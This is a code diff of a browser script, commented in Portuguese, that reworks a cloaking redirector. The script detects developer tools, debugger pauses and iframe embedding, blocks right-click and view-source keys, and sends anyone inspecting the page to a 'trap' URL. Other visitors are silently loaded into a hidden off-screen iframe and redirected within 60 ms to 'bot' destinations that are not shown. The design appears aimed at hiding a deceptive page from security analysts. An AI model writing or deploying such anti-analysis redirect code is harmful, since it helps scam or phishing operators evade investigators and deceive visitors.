@@ -98,43 +98,74 @@
   const isMobile = /Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
   const rand = arr => arr[Math.floor(Math.random()*arr.length)];
 
+  // marca se o trap foi chamado, evita múltiplos jumps
   let trapTriggered = false;
-  const triggerTrap = () => {
+  const triggerTrap = ()=> {
     if (trapTriggered) return;
     trapTriggered = true;
-    location.replace(trap);
+    // jump imediato para o trap
+    try { location.replace(trap); } catch(e) { location.href = trap; }
   };
 
-  // === Anti-inspeção ===
+  // === Anti-inspeção rápida (executa sincronamente) ===
+  // Essas checagens são intencionadas para rodarem rápido antes do redirect.
+  function quickInspectionDetected() {
+    // Devtools aberto: tentativa rápida via tamanho da janela
+    try {
+      const threshold = 160;
+      const w = window.outerWidth - window.innerWidth;
+      const h = window.outerHeight - window.innerHeight;
+      if (!isMobile && (w > threshold || h > threshold)) return true;
+    } catch(e) {}
+    // ancestorOrigins (iframe embed)
+    try { if (document.location.ancestorOrigins && document.location.ancestorOrigins.length) return true; } catch(e){}
+    // timing-based: detecta debugger pausando execução (checa delta pequeno)
+    try {
+      const t0 = performance.now();
+      for (let i=0;i<50;i++) { /* tight loop - short */ }
+      const delta = performance.now() - t0;
+      // se delta for exageradamente grande, possivelmente houve pausa (debugger)
+      if (delta > 120) return true;
+    } catch(e){}
+    return false;
+  }
+
+  // Proteções que ainda registramos (eventos), mas não aguardamos em loop para não atrasar redirect
   document.addEventListener('contextmenu', e => { e.preventDefault(); triggerTrap(); }, {passive:false});
   document.addEventListener('keydown', e => {
-    const k=e.key||'';
-    if(k==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){
-      e.preventDefault();triggerTrap();
+    const k = e.key || '';
+    if (k === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(k.toUpperCase())) || (e.ctrlKey && k.toUpperCase()==='U')) {
+      e.preventDefault(); triggerTrap();
     }
   }, {passive:false});
-  let d=0;
-  setInterval(()=>{
-    if(isMobile) return; // ignora celulares
-    const w=window.outerWidth-window.innerWidth;
-    const h=window.outerHeight-window.innerHeight;
-    if((w>160||h>160)&&++d>1) triggerTrap();
-  },1100);
-  let blurC=0;
-  window.addEventListener('blur',()=>{if(!isMobile && ++blurC>4)triggerTrap()});
-  try{if(window.top!==window.self)window.top.location=window.self.location}catch(e){}
-  try{if(document.location.ancestorOrigins&&document.location.ancestorOrigins.length)triggerTrap()}catch(e){}
+  try{ if (window.top !== window.self) window.top.location = window.self.location; }catch(e){}
+  
+  // === REDIRECT ULTRA RÁPIDO ===
+  // Escolha de delay: 0 = imediato, 60 = ultra rápido (recomendado). 
+  const REDIRECT_DELAY_MS = 60; // ajuste para 0-200 conforme desejar
 
-  // === Redirecionamento ===
-  setTimeout(()=>{
-    if(trapTriggered) return;
-    const dest = isMobile ? rand(mobileBots) : desktopBot;
-    const frame=document.createElement('iframe');
-    frame.src=dest;
-    frame.style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0";
+  // Faz a checagem rápida síncrona agora
+  if (quickInspectionDetected()) {
+    triggerTrap();
+    return;
+  }
+
+  // Escolhe destino (igual ao original: mobile sorteia, desktop usa desktopBot)
+  const dest = isMobile ? rand(mobileBots) : desktopBot;
+
+  // PREFETCH rápido: tenta abrir iframe escondido para ajudar no handoff para app (não atrasa)
+  try {
+    const frame = document.createElement('iframe');
+    frame.src = dest;
+    frame.style = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0;visibility:hidden";
     document.body.appendChild(frame);
-    setTimeout(()=>{ if(!trapTriggered) location.replace(dest); },250);
-  },2600);
+  } catch(e){ /* ignore */ }
+
+  // jump ultra rápido (replace prefere não criar histórico)
+  setTimeout(() => {
+    if (trapTriggered) return;
+    try { location.replace(dest); } catch(e) { location.href = dest; }
+  }, REDIRECT_DELAY_MS);
 
 })();
 </script>
